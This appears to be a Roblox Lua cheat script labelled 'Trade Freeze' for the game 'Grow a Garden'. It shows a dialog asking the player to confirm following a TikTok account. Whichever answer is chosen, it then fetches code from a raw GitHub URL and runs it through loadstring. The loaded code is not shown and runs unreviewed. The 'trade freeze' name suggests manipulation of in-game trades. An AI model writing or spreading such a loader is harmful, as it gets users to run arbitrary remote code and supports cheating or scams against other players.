task.wait(5)

-- Create UI
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local gui = Instance.new("ScreenGui")
gui.Parent = player:WaitForChild("PlayerGui")
gui.Name = "TradeFreezePrompt"

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 150)
frame.Position = UDim2.new(0.5, -150, 0.5, -75)
frame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
frame.BorderSizePixel = 0
frame.AnchorPoint = Vector2.new(0, 0)
frame.Parent = gui
frame.BackgroundTransparency = 0
frame.ClipsDescendants = true
frame.AutomaticSize = Enum.AutomaticSize.None
frame.AnchorPoint = Vector2.new(0.5, 0.5)
frame.Position = UDim2.new(0.5, 0, 0.5, 0)
frame.SizeConstraint = Enum.SizeConstraint.RelativeXY

-- Rounded corners
local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 10)
corner.Parent = frame

-- Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 30)
title.BackgroundTransparency = 1
title.Text = "Trade Freeze"
title.Font = Enum.Font.GothamBold
title.TextSize = 20
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.Parent = frame

-- Question
local question = Instance.new("TextLabel")
question.Size = UDim2.new(1, -20, 0, 50)
question.Position = UDim2.new(0, 10, 0, 40)
question.BackgroundTransparency = 1
question.Text = "Have you already followed me on tiktok?"
question.Font = Enum.Font.Gotham
question.TextSize = 16
question.TextWrapped = true
question.TextColor3 = Color3.fromRGB(255, 255, 255)
question.Parent = frame

-- Yes Button
local yesBtn = Instance.new("TextButton")
yesBtn.Size = UDim2.new(0.4, -5, 0, 30)
yesBtn.Position = UDim2.new(0, 10, 1, -40)
yesBtn.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
yesBtn.Text = "Yes"
yesBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
yesBtn.Font = Enum.Font.Gotham
yesBtn.TextSize = 16
yesBtn.Parent = frame

local yesCorner = Instance.new("UICorner")
yesCorner.CornerRadius = UDim.new(0, 8)
yesCorner.Parent = yesBtn

-- No Button
local noBtn = Instance.new("TextButton")
noBtn.Size = UDim2.new(0.4, -5, 0, 30)
noBtn.Position = UDim2.new(0.6, 5, 1, -40)
noBtn.BackgroundColor3 = Color3.fromRGB(170, 0, 0)
noBtn.Text = "No"
noBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
noBtn.Font = Enum.Font.Gotham
noBtn.TextSize = 16
noBtn.Parent = frame

local noCorner = Instance.new("UICorner")
noCorner.CornerRadius = UDim.new(0, 8)
noCorner.Parent = noBtn

-- Function for response
local function handleResponse(message)
    question.Text = message
    yesBtn.Visible = false
    noBtn.Visible = false

    -- After 5 seconds remove prompt and load external script
    task.delay(5, function()
        gui:Destroy()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/GaGscripts-lua/Grow-a-Garden/refs/heads/main/tradefreeze"))()
    end)
end

-- Button connections
yesBtn.MouseButton1Click:Connect(function()
    handleResponse("Enjoy using the script!!")
end)

noBtn.MouseButton1Click:Connect(function()
    handleResponse("Please follow to support the channel")
end)
